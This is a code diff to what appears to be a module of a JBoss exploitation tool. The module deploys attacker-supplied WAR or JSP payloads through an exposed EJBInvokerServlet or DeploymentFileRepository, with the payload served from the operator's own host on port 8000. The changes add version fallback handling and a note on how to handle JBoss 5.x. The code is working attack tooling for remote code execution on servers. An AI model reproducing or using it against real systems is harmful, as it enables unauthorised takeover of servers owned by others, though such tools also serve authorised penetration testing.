@@ -9,7 +9,10 @@ import utility
 versions = ["Any", "3.2", "4.0", "4.2", "5.0", "5.1"]
 title = JINTERFACES.EIN
 def deploy(fingerengine, fingerprint):
-    """
+    """ This deployer attempts to deploy to the EJBInvokerServlet, often
+    left unprotected.  For versions 3.x and 4.x we can deploy WARs, but for 5.x
+    the HttpAdaptor invoker is broken (in JBoss), so instead we invoke 
+    the DeploymentFileRepository method.  This requires a JSP instead of a WAR.
     """
 
     war_file = fingerengine.options.deploy
@@ -21,8 +24,34 @@ def deploy(fingerengine, fingerprint):
                     fingerengine.options.ip, fingerprint.port)
     local_url = "http://{0}:8000/{1}".format(utility.local_address(), war_name)
 
-    fp = [f for f in fingerengine.fingerprints if f.version != 'Any'][0]
+    # the attached fingerprint doesnt have a version; lets pull one of the others
+    # to fetch it.  dirty hack.
+    fp = [f for f in fingerengine.fingerprints if f.version != 'Any']
+    if len(fp) > 0:
+        fp = fp[0]
+    else:
+        ver = utility.capture_input("Could not reliably determine version, "
+                                    "please enter the remote JBoss instance"
+                                    " version")
+        if len(ver) > 0:
+            if '.' not in ver:
+                ver += '.0'
+
+            if ver not in versions:
+                utility.Msg("Failed to find a valid fingerprint for deployment.", LOG.ERROR)
+                return
+            else:
+                fp = fingerprint
+                fp.version = ver
+        else:
+            return
+
     if fp.version in ["5.0", "5.1"]:
+        if '.war' in war_file:
+            utility.Msg("Deploying via an exposed invoker for JBoss "
+                        "5.x requires a JSP payload", LOG.ERROR)
+            return
+
         response = invkdeploy(fp.version, url, abspath(war_file))
 
         if len(response) > 1:
